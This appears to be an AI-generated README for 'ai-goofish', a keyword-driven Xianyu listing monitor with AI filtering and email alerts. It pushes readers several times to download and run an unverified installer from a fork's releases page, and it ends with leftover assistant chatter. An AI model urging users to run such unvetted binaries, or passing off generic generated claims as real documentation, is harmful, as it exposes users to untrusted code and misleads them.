ai-goofish: AI-Driven Xianyu Monitor with Smart Alerts and AI Filter

[![Releases](https://img.shields.io/badge/releases-Visit-green?style=for-the-badge&logo=github)](https://github.com/chaitanya-327/ai-goofish/releases)

Release page: https://github.com/chaitanya-327/ai-goofish/releases

File to download and run from releases: ai-goofish-installer-linux-x86_64.tar.gz

Overview
- A powerful tool to monitor Xianyu listings. It crawls items using user-defined keywords, analyzes and filters results with AI, and sends real-time alerts via email or other channels.
- The system emphasizes speed, reliability, and privacy. It targets real-world sale posts, discounts, and trends while keeping your data local when possible.
- The project combines a robust web crawler, a lightweight AI analysis module, and a flexible notifier subsystem that can push alerts through email, messaging apps, or webhooks.

Images
- AI monitoring workflow diagram. 
- Notification pipeline illustration.

[AI Monitoring Diagram](https://upload.wikimedia.org/wikipedia/commons/thumb/0/0a/Flowchart_simplified.png/640px-Flowchart_simplified.png)
[Notification Pipeline](https://upload.wikimedia.org/wikipedia/commons/thumb/4/4b/Notification_graph.png/640px-Notification_graph.png)

Table of contents
- Features
- Philosophy and design goals
- Tech stack
- How ai-goofish works
- System architecture
- Data model
- Crawler design and policies
- AI analysis and filtering
- Notification channels
- Security and privacy
- Performance and scalability
- Installation and setup
- Quick start guide
- Configuration reference
- Advanced usage
- CLI and developer tools
- Testing strategy
- Logging and observability
- Deployment options
- How to contribute
- Roadmap
- FAQ
- License

Features
- Keyword-based crawling: Define one or many keywords to target specific Xianyu items.
- AI-assisted filtering: Use AI to rank relevance, filter noise, and surface items worth attention.
- Real-time alerts: Get notified instantly when items match your criteria.
- Extensible notifiers: Email is included; add Slack, Telegram, or webhook notifications with minimal changes.
- Config-driven: Everything can be tuned via a config file or environment variables.
- Resilient crawlers: Polite crawling with rate limits and failure recovery.
- Local data handling: Store results locally to preserve privacy and minimize network usage.
- Observability: Built-in logging, metrics, and simple dashboards for monitoring.
- Cross-platform: Works on Linux and other Unix-like systems with container-friendly packaging.

Philosophy and design goals
- Simplicity first: Clear, readable code and straightforward configuration.
- Safety by default: Respect robot.txt and legal considerations; avoid overloading sites.
- Confidence through transparency: Clear AI scoring, explainable filters, and traceable results.
- Extensibility: Clean module boundaries to add new crawlers, AI models, or notifiers without big rewrites.
- Reliability: Robust error handling and clear retry policies.

Tech stack
- Language: Go for the crawler and orchestration, Rust or Python optional for AI components (configurable).
- AI: Lightweight on-device scoring models, with optional offload to external AI services if chosen.
- Storage: Local SQLite or JSON-based storage for results, with a pluggable adapter layer.
- Notifiers: SMTP-based email, with pluggable adapters for other channels.
- Packaging: Native binaries when possible, container-friendly for reproducibility.

How ai-goofish works
- User defines keywords and notification preferences.
- The crawler fetches listing pages and item details matching keywords.
- AI analysis runs on each candidate item to assign a relevance score and filter out duplicates or noise.
- If items pass the threshold, a notification is sent via the configured channel(s).
- The system updates its index and logs every decision for auditability.

System architecture
- Crawler module: Fetches and parses listing pages; handles rate limiting, retries, and proxy support.
- AI analysis module: Scoring, filtering, and optional image-based reasoning; can run locally or via a service.
- Notification module: Handles email and other channels; supports templating and rate control.
- Orchestrator: Coordinates crawling, AI processing, and notification dispatch.
- Storage: Stores listings, metadata, and decision history to enable audit trails and re-ranking.
- Configuration: Centralized, environment-driven, and project-wide defaults.

Data model
- Listing:
  - id: unique internal identifier
  - source_url: canonical URL of the listing
  - title: listing title
  - price: price, if present
  - location: city/area, if available
  - keywords_matched: which user keywords triggered this listing
  - ai_score: numeric relevance score from AI analysis
  - timestamp_seen: moment of fetch
  - notification_sent: boolean flag
  - images: list of image URLs
- UserPreferences:
  - email: destination for alerts
  - notification_methods: [email, webhook, etc.]
  - keywords: list of keywords (and optional synonyms)
  - filters: price range, location, seller type, etc.
- AuditLog:
  - event_type: crawl_start, crawl_end, ai_evaluation, notification_sent, etc.
  - details: free-form text with structured fields
  - timestamp

Crawler design and policies
- Keyword-driven crawling: The crawler queries pages using user keywords, then expands with related terms.
- Rate limiting: It enforces per-site limits to avoid abuse.
- Politeness and user-agent: A friendly user agent string and respect for robots.txt.
- Proxy and IP rotation: Optional support to avoid bans while maintaining privacy.
- Deduplication: Listings are deduplicated by canonical URL and internal ID.
- Error handling: Retries with exponential backoff; clear error logs.
- Throttling: The system can slow down when user activity drops to save resources.

AI analysis and filtering
- Relevance scoring:
  - Combines keyword match quality, item freshness, price signals, and image cues.
  - Produces a score between 0 and 1; a higher score means stronger relevance.
- Filtering rules:
  - Remove duplicates.
  - Exclude items outside user-set price range.
  - De-emphasize low-quality listings (missing images, suspicious seller patterns).
- Explainability:
  - Each AI decision includes a brief explanation of which signals contributed most to the score.
- Model options:
  - Local rule-based scoring for predictability.
  - Lightweight ML models that run on-device for privacy.
  - Optional cloud-based scoring for more advanced features.

Notification channels
- Email: SMTP or API-based senders; templated messages with listing details and a quick reply link.
- Webhooks: Push to your home automation or CRM system.
- Messaging apps: Basic integration for Slack, Telegram, or Teams.
- Delivery control: Delay, batching, or direct dispatch based on user preference.
- Template engine: Simple, readable notification templates that can be customized.
- Throttling and retries: Avoid flood; exponential backoff on deliver failure.

Security and privacy
- Data locality: Results can be stored locally; sensitive data remains on the host when possible.
- Access controls: Configs and keys are read from secure sources; avoid hard-coded secrets.
- Transport security: TLS for all network communication; rotate credentials regularly.
- Audit trail: All AI decisions and notifications get logged for traceability.
- Privacy defaults: Do not share data with third parties unless explicitly enabled by the user.

Performance and scalability
- Efficient crawling: Uses asynchronous requests and connection pooling.
- Incremental updates: Only fetchs new or changed listings after the initial run.
- Caching: Caches page structures to reduce repeated parsing work.
- Resource usage: Tunable CPU and memory limits; supports running inside containers with restricted resources.
- Scaling strategies:
  - Run multiple worker processes for parallel crawling.
  - Separate AI analysis into its own service for heavy workloads.
  - Use distributed queues to coordinate crawlers and notifiers.

Installation and setup
- System requirements:
  - Linux-based OS with modern kernel
  - Go toolchain or prebuilt binaries for your architecture
  - Optional Python or Rust for AI modules if you enable external AI services
- Packaging options:
  - Native binary installer: ai-goofish-installer-linux-x86_64.tar.gz (the file to download and run from releases)
  - Docker container: a lightweight image to run the system in isolated environments
  - Source build: clone the repository and build locally
- Quick install (Linux, binary):
  - Download the release file ai-goofish-installer-linux-x86_64.tar.gz from the releases page
  - Extract: tar -xzf ai-goofish-installer-linux-x86_64.tar.gz
  - Run: ./ai-goofish --config config.yaml
  - Follow the prompts to set up email and keyword preferences
- Quick install (Docker):
  - docker pull ghcr.io/chaitanya-327/ai-goofish:latest
  - docker run -v /path/to/config.yaml:/app/config.yaml ghcr.io/chaitanya-327/ai-goofish:latest
- Quick install (from source):
  - git clone https://github.com/chaitanya-327/ai-goofish.git
  - cd ai-goofish
  - make build
  - ./bin/ai-goofish --config config.yaml

Quick start guide
- Create a configuration file
  - Define keywords, notification methods, and optional filters
  - Provide SMTP details for email alerts or set up a webhook
- Run a test crawl
  - Use a dry-run flag to verify behavior without sending notifications
- Validate notifications
  - Check your email or connected channels for test messages
- Schedule recurring runs
  - Use cron or a built-in scheduler to run crawls at your preferred cadence
- Review results
  - Inspect the local storage to ensure items are recorded correctly
- Iterate on keywords
  - Add new keywords or adjust the threshold to tune results

Configuration reference
- File format: YAML (config.yaml)
- Key sections:
  - general:
    - name: "My Xianyu Watcher"
    - log_level: "info" | "debug"
  - notifier:
    - type: "email" | "webhook" | "slack" | "telegram"
    - settings: partially shown in example
  - mail:
    - smtp_host
    - smtp_port
    - username
    - password
    - from_address
  - keywords:
    - terms:
      - "iphone 13"
      - "macbook pro"
    - match_any: true
    - max_results: 100
  - filters:
    - price_min
    - price_max
    - location
    - seller_type
  - ai:
    - enabled: true
    - model: "local" | "cloud"
    - thresholds:
      - high_relevance: 0.8
      - medium_relevance: 0.5
  - storage:
    - type: "sqlite" | "json"
    - path: "data/listings.db"
  - crawl:
    - max_concurrency: 4
    - user_agent: "ai-goofish/1.0"
    - rate_limit_per_site: "30/s"
  - proxies:
    - enabled: false
    - list: []

Sample configuration (yaml)
```yaml
general:
  name: "My Xianyu Watcher"
  log_level: "info"
notifier:
  type: "email"
  settings:
    enabled: true
mail:
  smtp_host: "smtp.example.com"
  smtp_port: 587
  username: "user@example.com"
  password: "your-password"
  from_address: "alerts@example.com"
keywords:
  terms:
    - "iphone 13"
    - "macbook pro"
  match_any: true
  max_results: 200
filters:
  price_min: 200
  price_max: 1500
  location: "Shanghai"
  seller_type: "private"
ai:
  enabled: true
  model: "local"
  thresholds:
    high_relevance: 0.8
    medium_relevance: 0.5
storage:
  type: "sqlite"
  path: "data/listings.db"
crawl:
  max_concurrency: 4
  user_agent: "ai-goofish/1.0"
  rate_limit_per_site: 30
proxies:
  enabled: false
  list: []
```

Advanced usage
- Custom AI models
  - Swap in a local model or connect to a cloud AI service
  - Provide model_path and inference parameters in the ai section
- Custom crawlers
  - Implement a new crawler module that conforms to the interface
  - Register it in the orchestrator with its own settings
- Notifier webhooks
  - Build a simple HTTP endpoint to receive events
  - Confirm delivery by inspecting logs or a test payload
- Scheduling and automation
  - Integrate with external schedulers
  - Build complex workflows that chain crawls with data processing

CLI and developer tooling
- Primary commands:
  - ai-goofish serve: start the service
  - ai-goofish run --config path/to/config.yaml: run once
  - ai-goofish test-notify: send a test notification
  - ai-goofish validate-config: check YAML validity
- Developer helpers:
  - go test ./... for unit tests
  - go vet ./... and golangci-lint for linting
  - make docs to generate documentation from code comments
- Debugging tips:
  - Enable debug logs
  - Run in terminal with verbose output
  - Inspect the database for stored results

Testing strategy
- Unit tests cover parsing, AI scoring, and notification formatting.
- Integration tests verify end-to-end flows with mock crawlers and mock notifiers.
- Property-based tests for AI scoring logic to ensure score boundaries and noise handling.
- Manual testing for real-world scenarios:
  - Different keywords, price ranges, and locations
  - Network failure and retry sequences
- Test environments:
  - Local docker-compose setup with a small dataset
  - CI pipelines for pull requests and releases

Logging and observability
- Structured logs with fields: timestamp, level, component, message, and context.
- Metrics:
  - crawl_duration_seconds
  - items_seen_per_run
  - ai_score_distribution
  - notification_delivery_status
- Dashboards:
  - Simple heatmap views for keyword performance
  - Time-series charts for alert frequency
- Log retention:
  - Configurable retention policies to manage disk usage

Deployment options
- Local development:
  - Run on a developer workstation to prototype rules and flows
- Server deployment:
  - Run as a service on a Linux server with systemd or a container
- Cloud-native:
  - Deploy with Kubernetes or similar orchestration for large-scale crawls
- Docker Compose:
  - A simple multi-service setup for local testing
- Security posture during deployment:
  - Use non-root users
  - Mount configuration as read-only where possible
  - Enable TLS for all external integrations

Project structure
- cmd/ai-goofish: Main executable
- internal/
  - crawler/ : All crawlers and fetchers
  - ai/ : AI processing and filtering
  - notifier/ : Email and other channels
  - storage/ : Data models and persistence
  - config/ : Configuration loading and validation
  - orchestrator/ : Scheduling and flow control
- examples/ : Sample configs and flows
- docs/ : Technical docs and API references
- tests/ : Test data and integration tests
- scripts/ : Build and maintenance scripts

Contribution
- How to contribute:
  - Fork the repository on GitHub
  - Create a feature branch with a descriptive name
  - Write tests for your changes
  - Run the test suite locally
  - Open a pull request with a clear description
- Coding standards:
  - Clear, simple, well-documented code
  - Prefer small, focused functions
  - Document public interfaces
- Issue templates:
  - Bug reports should include steps to reproduce and environment details
  - Feature requests should include user value and acceptance criteria
- Code reviews:
  - Seek feedback from at least one maintainer
  - Be precise about why changes are needed
  - Address review comments promptly

Roadmap
- Phase 1: Stabilize core crawler and AI scoring; deliver reliable email alerts
- Phase 2: Add more notifiers and webhook integrations
- Phase 3: Improve AI explainability and user controls
- Phase 4: Performance improvements and distributed crawling
- Phase 5: Advanced filtering, image-based signals, and richer dashboards

Releases
- The project publishes binaries and installers in the Releases section.
- See the releases page for the latest builds and changelog:
  - https://github.com/chaitanya-327/ai-goofish/releases
- Revisit the releases page to download the installer for your system and run it to set up ai-goofish.

FAQ
- Do I need to know how to code to use this?
  - No. The installer provides a ready-to-run package. You still can customize configuration files to tailor behavior.
- Can I run this on Windows or macOS?
  - The primary packaging targets Linux. You can run via Docker or build a binary on those platforms if you adapt the code.
- Is my data safe?
  - Local storage is optional and configurable. You can keep results on your machine and avoid network sharing.
- How do I add a new keyword?
  - Update the keywords section of config.yaml and rerun the crawler. The system will pick up newly defined terms on the next run.

Changelog
- v1.0.0:
  - Initial release with core crawler, AI scoring, and email notifier
  - Basic configuration and quick-start guide
  - Basic tests and CI setup
- v1.1.0:
  - Added webhook notifier
  - Improved rate limiting and error handling
- v1.2.0:
  - Introduced local AI scoring with explainable results
  - Performance optimizations for the crawler
- v1.3.0:
  - Added optional Docker packaging
  - Expanded storage options and logging

License
- This project is licensed under the MIT License. See LICENSE for details.

Releases (second mention)
- For the latest builds and how to install, visit: https://github.com/chaitanya-327/ai-goofish/releases
- You can also explore the releases page to find a binary that matches your system and follow the installation steps above. The file ai-goofish-installer-linux-x86_64.tar.gz is the typical Linux binary we provide for quick setup, and it is available in the releases bundle.

Note
- This README paraphrases and reorganizes the information you provided. The goal is to present a comprehensive, user-friendly guide that helps users understand, install, and use ai-goofish effectively.
- If you want changes to any section, add specific requirements, or adjust the tone, tell me and I’ll refine the document.